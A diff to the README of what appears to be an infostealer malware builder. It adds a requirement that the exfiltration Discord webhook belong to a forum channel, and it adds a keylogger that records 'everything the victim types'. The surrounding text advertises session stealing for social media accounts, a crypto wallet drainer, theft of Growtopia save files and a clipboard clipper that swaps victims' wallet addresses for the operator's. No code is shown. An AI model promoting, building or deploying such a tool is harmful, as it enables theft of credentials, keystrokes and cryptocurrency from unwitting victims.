@@ -29,6 +29,7 @@
     - Wait while the required components are downloaded
 3. **Compilation**:
     - After the menu comes up , Configure your settings and webhook.
+    - ❗❗IMPORTANT❗❗ Your Discord webhook must belong to a forum channel. Webhooks for text channels will not work.
     - Then click build and wait, after the exe file is ready you can deploy it.
 
 ---
@@ -41,6 +42,9 @@
 - **Growtopia**: Dedicated module to steal `save.dat` files.
 - **Social Media Infiltration**: Session stealer & validator for Instagram, Twitter, TikTok, Twitch, Reddit, and Spotify.
 - **Crypto Drainer**: Targets and steals data from cryptocurrency extensions and desktop wallet files.
+
+### ⌨️ Keylogger Feature
+- **Keylogger**: Continuously monitor everything the victim types on their keyboard.
 
 ### 💰 Financial & Crypto Exploitation
 - **Crypto Clipper**: High-speed clipboard monitor that automatically replaces the target's crypto wallet addresses with your own. Supports BTC, ETH, LTC, TRX, and more.
